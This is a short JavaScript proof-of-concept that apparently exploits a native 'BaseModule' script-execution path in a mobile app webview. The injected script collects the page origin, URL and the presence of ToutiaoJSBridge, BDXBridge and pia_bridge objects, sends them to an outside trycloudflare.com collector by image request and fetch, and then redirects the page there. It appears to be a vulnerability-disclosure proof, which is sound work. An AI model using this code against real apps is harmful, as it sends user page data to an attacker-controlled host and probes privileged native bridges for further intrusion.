(() => {
  const base = NativeModules.get("BaseModule");
  const webScript = `(() => {
    const collector = "https://cheque-britannica-picnic-formats.trycloudflare.com";
    const event = "PIA_EC_ROUTE_WORKER_EXEC" +
      "|origin=" + location.origin +
      "|href=" + location.href +
      "|toutiao=" + typeof window.ToutiaoJSBridge +
      "|bdx=" + typeof window.BDXBridge +
      "|pia=" + typeof window.pia_bridge;
    const proof = collector + "/worker-proof?event=" + encodeURIComponent(event);
    try {
      const image = new Image();
      image.src = proof + "&transport=image";
      window.__piaEcWorkerProof = image;
    } catch (_) {}
    try {
      fetch(proof + "&transport=fetch", {mode: "no-cors", cache: "no-store"}).catch(() => {});
    } catch (_) {}
    setTimeout(() => { location.href = proof + "&transport=navigate"; }, 1800);
  })()`;
  base.handleScript(webScript);
})();
